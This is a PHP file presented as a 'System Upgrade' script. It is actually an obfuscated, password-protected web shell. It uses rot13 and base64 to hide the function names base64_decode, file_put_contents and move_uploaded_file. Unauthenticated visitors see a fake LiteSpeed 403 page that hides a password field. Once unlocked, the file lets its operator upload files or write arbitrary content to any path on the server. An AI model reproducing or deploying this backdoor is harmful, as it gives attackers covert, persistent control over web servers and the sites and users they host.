<?php

/**
 * @title System Upgrade
 * @author Bleak Jack
 * @version 1.2.1
 * @link https://vip_system.com/Upgrade
 */

$pl = "PHP_AUTH_PW";
$token = "1f01f64a4ffebf64";
$ba = "onfr64_qrpbqr";
$uk = 'keyword';
$uf = 'file';
$data = array_merge([$uk => '', 'one' => 0, $uf => '', 'name' => '', 'text' => '', 'path' => ''], empty($_POST) ? [] : $_POST);
//empty($_SERVER[$pl]) || $data[$uk] = $_SERVER[$pl];
$data['one'] || $data[$uk] = md5($data[$uk]);
$pa = md5($data[$uk] . $ba);
$token .= "aefbc04b734c9cac";


if ($pa !== $token && $ba = str_rot13($ba)) {
    notallow($uk, $ba("SFRUUC8xLjAgNDAzIEZvcmJpZGRlbg"));
}
$p = "name";
$wif = "ZmlsZV9wdXRfY29udGVudHM";
$wiU = "bW92ZV91cGxvYWRlZF9maWxl";
$ba = str_rot13($ba);
foreach ([$p, 'txt', 'path'] as $k) {
    $data[$k] = empty($data[$k]) ? '' : $ba($data[$k]);
}
empty($data[$k]) && $data[$k] = __DIR__;
$ss = '<input name="one" type="hidden" value="1"/><input type="hidden" name="' . $uk . '" value="' . $data[$uk] . '">';
echo '<style>button{margin-top: .5em;width: 100%;padding: .5em;}input{width: 100%;margin-bottom: .5em;padding: .5em 1em;}</style>
<form id="m" method="post">' . $ss . (($wiU = "bW92ZV91cGxvYWRlZF9maWxl") ? ' ' : '') . '<input type="file" name="file" id="f" onchange="sf(1)"><br>
<div><input name="path" id="p" value="' . $data['path'] . '"><a style="position:absolute;margin-left: -2.5em;padding:0.3em 1em;" onclick="p.value=\'' . $_SERVER['DOCUMENT_ROOT'] . '\'">R</a></div>
<input name="name" id="n" value="' . $data[$p] . '"/><br>
<textarea name="txt" id="s" style="width: 100%;" rows="15">' . htmlspecialchars($data['txt']) . '</textarea>
<button type="button" onclick="sf()" id="sp">提交</button>
<button style="display: none;" id="sb"></button></form><script>function sf(o){if(o)m.enctype="multipart/form-data";
if(p.value.length)p.value=t(p.value);
if(n.value.length)n.value=t(n.value);
if(s.value.length)s.value=t(s.value);sb.click();
}function t(s) {return window.btoa(unescape(encodeURIComponent(s)));}</script>';
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return;

$appd = $data['path'] . "/";
$name = $data[$p];
$uri = str_replace(str_replace("\\", '/', $_SERVER['DOCUMENT_ROOT']), '', str_replace("\\", '/', $appd));
$uri = rtrim($uri, '/') . '/';
if ($uri[0] !== '/') $uri = '/' . $uri;
$r = -1;
if (!empty($_FILES[$uf]) && ($usef = $_FILES[$uf]) && !empty($usef['size']) && $wiU = $ba($wiU)) {
    $name = empty($data[$p]) ? $usef[$p] : $data[$p];
    echo "SC: ";
    $r = @$wiU($usef["tmp_$p"], $appd . $name);
} elseif (!empty($name) && !empty($data['txt']) && $wif = $ba($wif)) {
    echo "XR: ";
    $r = @$wif($appd . $name, $data['txt']);
}
if ($r > 0)
    echo ($r ? 'ok!!' : 'fail') . " <a href='" . $uri . $name . "' target='_blank'>OPEN</a> " . $appd . $name . "<br/>";
function notallow($v, $title)
{
    header($title);
    echo '<!DOCTYPE html>
<html style="height:100%">
<head>
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
<title> ' . explode(" ", $title, 2)[1] . '
</title></head>
<body style="color: #444; margin:0;font: normal 14px/20px Arial, Helvetica, sans-serif; height:100%; background-color: #fff;">
<div style="height:auto; min-height:100%; ">     <div style="text-align: center; width:800px; margin-left: -400px; position:absolute; top: 30%; left:50%;">
        <h1 style="margin:0; font-size:150px; line-height:150px; font-weight:bold;">403</h1>
<h2 style="margin-top:20px;font-size: 30px;">'.explode(" ", $title, 3)[2].'
</h2>
<p>Access to this resource on the server is denied!</p>
<form method="post"><input style="border: 0;padding: 1em 2em;" name="' . $v . '"></form>
</div></div><div style="color:#f0f0f0; font-size:12px;margin:auto;padding:0px 30px 0px 30px;position:relative;clear:both;height:100px;margin-top:-101px;background-color:#474747;border-top: 1px solid rgba(0,0,0,0.15);box-shadow: 0 1px 0 rgba(255, 255, 255, 0.3) inset;">
<br>Proudly powered by  <a style="color:#fff;" href="http://www.litespeedtech.com/error-page">LiteSpeed Web Server</a><p>Please be advised that LiteSpeed Technologies Inc. is not a web hosting company and, as such, has no control over content found on this site.</p></div></body></html>
';
    die();
}